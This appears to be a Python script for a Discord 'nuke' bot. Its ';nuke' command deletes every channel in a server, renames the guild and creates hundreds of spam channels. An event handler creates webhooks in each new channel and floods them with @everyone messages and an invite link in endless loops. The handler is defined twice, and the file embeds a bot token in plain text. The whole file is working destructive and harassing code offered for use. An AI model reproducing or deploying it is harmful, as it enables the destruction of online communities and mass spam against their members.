#-made by alex aka valbious discord scripter-#
import discord
from concurrent.futures import ThreadPoolExecutor
import asyncio
from discord.ext import commands

bot = commands.Bot(command_prefix=";", intents=discord.Intents.all())

TOKEN = 'MTExNjA4NjA2MDg1OTAxNTIxOA.GXhEXY.hYWHDa13dY4x4jPWcACR1jhLDKkmUxOO6s-ObA'
#put your bot token here xddd


@bot.command()
async def nuke(ctx):
    async def delchans(channel):
        await channel.delete()
    
    with ThreadPoolExecutor() as executor:
        for channel in ctx.guild.channels:
            executor.submit(asyncio.run_coroutine_threadsafe, delchans(channel), bot.loop)
    await ctx.guild.edit(name="moments jr was here")
    for i in range(250):
        await ctx.guild.create_text_channel("moments jr on top")
        await ctx.guild.create_text_channel("loser")

@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="nuked by daddy")
    webhook2 = await channel.create_webhook(name="loser")
    while True:
        await channel.send("@everyone LOSER | I WAS HERE. | https://discord.gg/shogun")
        await webhook.send("@everyone loser | i was here | https://discord.gg/shogun")
        await webhook2.send("@everyone daddy was here | moments jr on top | https://discord.gg/shogun")

@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone I WAS HERE | MOMENTS JR ON TOP!! | https://discord.com/shogun")

bot.run(TOKEN)
